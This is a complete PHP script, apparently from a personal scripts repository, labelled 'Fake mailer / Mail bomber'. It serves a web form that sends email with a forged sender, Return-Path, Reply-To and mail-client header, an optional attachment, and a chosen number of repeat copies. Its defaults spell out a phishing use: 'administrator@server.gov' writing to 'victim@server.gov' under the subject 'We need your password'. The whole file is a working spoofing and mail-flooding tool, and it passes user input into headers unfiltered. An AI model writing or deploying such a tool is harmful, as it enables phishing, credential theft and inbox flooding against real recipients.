<?php
/*
    Application:  	  Fake mailer / Mail bomber
    Version:		  0.2
    Author: 		  René Kliment <rene.kliment@gmail.com>
    Website: 		  https://github.com/renekliment/scripts
    License: 		  GNU Affero General Public License
========================================================================
*/

echo <<<HTMLB
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta http-equiv="content-language" content="en" />
    <title>Fake mailer / Mail bomber</title>
    <meta name="description" content="Fake mailer / Mail bomber" />
    <style type="text/css">
	td {
	    background-color: lightskyblue;
	    padding: 2px;
	}

	textarea {
	    width: 380px;
	}

	.error {
	    color: red;
	}

	.successful {
	    color: green;
	}

	.notsuccessful {
	    color: red;
	}
    </style>
</head>
<body>

<h1>Fake mailer / Mail bomber</h1>
HTMLB;

if (!isset($_REQUEST['sendit'])) {

    echo <<<HTMLFORM
<form action="?" method="post" enctype="multipart/form-data">
<fieldset><legend>Form</legend>
<table>
<tbody>
    <tr>
	<td><label for="recipient">Recipient: </label></td>
	<td><input type="text" name="recipient" id="recipient" value="victim@server.gov" /></td>
    </tr>
    <tr>
        <td><label for="sender">Sender: </label></td>
        <td><input type="text" name="sender" id="sender" value="administrator@server.gov" /></td>
    </tr>
    <tr>
        <td><label for="subject">Subject: </label></td>
        <td><input type="text" name="subject" id="subject" value="We need your password" /></td>
    </tr>
    <tr>
        <td><label for="attachment">Attachment: </label></td>
        <td><input type="file" name="attachment" id="attachment" /></td>
    </tr>
    <tr>
        <td><label for="xmailer">X-Mailer: </label></td>
        <td><input type="text" name="xmailer" id="xmailer" value="Thunderbird 1.5.0.9 (X11/20061219)" /></td>
    </tr>
    <tr>
        <td><label for="number">Number of messages: </label></td>
        <td><input type="text" name="number" id="number" value="1" /></td>
    </tr>
    <tr>
        <td>Encoding: </td>
        <td>
            <label for="encoding-utf-8">UTF-8</label>
            <input type="radio" name="encoding" value="utf-8" id="encoding-utf-8" checked="checked" />

            <label for="encoding-windows-1250">Windows 1250</label>
            <input type="radio" name="encoding" value="windows-1250" id="encoding-windows-1250" />

            <label for="encoding-iso-8859-2">ISO-8859-2</label>
            <input type="radio" name="encoding" value="iso-8859-2" id="encoding-iso-8859-2" />
        </td>
    </tr>
    <tr>
        <td>Type of the message:</td>
        <td>
            <label for="type-plain">text/plain</label>
            <input type="radio" name="type" value="plain" id="type-plain" checked="checked" />

            <label for="type-html">text/html</label>
            <input type="radio" name="type" value="html" id="type-html" />
        </td>
    </tr>
    <tr>
        <td><label for="content">Content: </label></td>
        <td><textarea name="content" id="content" cols="30" rows="10"></textarea></td>
    </tr>
    <tr>
        <td><input type="hidden" name="sendit" value="yes" /></td>
        <td><input type="submit" value="Send" /></td>
    </tr>
</tbody>
</table>
</fieldset>
</form>
HTMLFORM;
} else {
	/* Some headers */
	$header  = "From: ".$_REQUEST['sender']."\n";
	$header .= "MIME-version: 1.0\n";
	$header .= "X-Mailer: ".$_REQUEST['xmailer']."\n";
	$header .= "Return-Path: ".$_REQUEST['sender']."\n";
	$header .= "Reply-To: ".$_REQUEST['sender']."\n";

	/* Attachment? */
	if (is_uploaded_file($_FILES['attachment']['tmp_name'])) {
	    $attachment      = $_FILES['attachment']['tmp_name'];
	    $attachment_type = $_FILES['attachment']['type'];
	    $attachment_name = $_FILES['attachment']['name'];

	    $f = fopen($attachment, 'r');
	    if (!$f) {
			echo '<strong class="error">Error! Cannot open attachment! E-mail(s) have not been sent!</strong>';
			break;
	    }

	    /* base64 stuff */
	    $attachment_content = fread($f, filesize($attachment));
	    $attachment_content = chunk_split(base64_encode($attachment_content));
	    fclose($f);

	    /* Boundary */
	    $boundary = strtoupper(md5(uniqid("bound_")));
	    $header .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\n\n";
	    $header .= "This is a multi-part message in MIME format.\n\n";
	    $header .= "--" . $boundary . "\n";

	    /* Content of e-mail(s) */
	    $header .= 'Content-Type: text/'.$_REQUEST['type'].'; charset="'.$_REQUEST['encoding']."\"\n";
	    $header .= "Content-Transfer-Encoding: quoted-printable\n\n";
	    $header .= imap_8bit($_REQUEST['content']) . "\n\n";
	    $header .= "--" . $boundary . "\n";

	    /* Attachment */
	    $header .= "Content-Type: $attachment_type\n";
	    $header .= "Content-Transfer-Encoding: base64\n";
	    $header .= "Content-Disposition: attachment; filename=\"$attachment_name\"\n\n";
	    $header .= $attachment_content . "\n\n";
	    $header .= "--" . $boundary . "--";
	} else {
	    $header .= 'Content-Type: text/'.$_REQUEST['type'].'; charset="'.$_REQUEST['encoding']."\"\n";
	    $header .= "Content-Transfer-Encoding: quoted-printable\n\n";
	    $header .= imap_8bit($_REQUEST['content']) . "\n\n";
	}

	/* Send it n-times */
    for ($i=1; $i < $_REQUEST['number']+1; $i++) {
		$m = mail($_REQUEST['recipient'], $_REQUEST['subject'], '', $header);
		if ($m) {
			echo '<strong class="successful">E-Mail n. '.$i.' has been sent successfully.</strong><br />';
		} else {
			echo '<strong class="notsuccessful">E-Mail n. '.$i.' has NOT been sent successfully.</strong><br />';
		}
    }
}

echo '

</body>
</html>';
?>